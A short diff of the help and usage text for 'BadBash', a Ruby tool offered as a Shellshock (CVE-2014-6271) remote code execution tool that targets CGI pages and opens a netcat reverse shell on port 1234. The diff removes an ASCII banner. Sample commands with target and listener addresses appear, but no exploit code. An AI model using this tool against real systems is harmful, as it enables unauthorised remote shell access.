@@ -10,18 +10,13 @@ License : GPLv3
 ================================================================================================
 RainMak3r@Could:~/Desktop# ruby BadBash.rb  -h
 
-
-   ___           _   ___           _     
-  / __\ __ _  __| | / __\ __ _ ___| |__  
- /__\/// _` |/ _` |/__\/// _` / __| '_ \ 
-/ \/  \ (_| | (_| / \/  \ (_| \__ \ | | |
-\_____/\__,_|\__,_\_____/\__,_|___/_| |_|
-
 BadBash - CVE-2014-6271 RCE tool by Andy Yang
 Basic version only checks for HTTP site
 Basic version only provides netcat reverse shell on port 1234
 
+
 EXAMPLE USAGE:
+
      ./BBash.rb  -t 'www.target.com/cgi-folder/cgi.sh' -d '127.0.0.1'
      ./BBash.rb  -t '10.0.0.1/cgi-folder/cgi.sh' -d '127.0.0.1'
     -t, --Target CGI path            Full path of CGI page
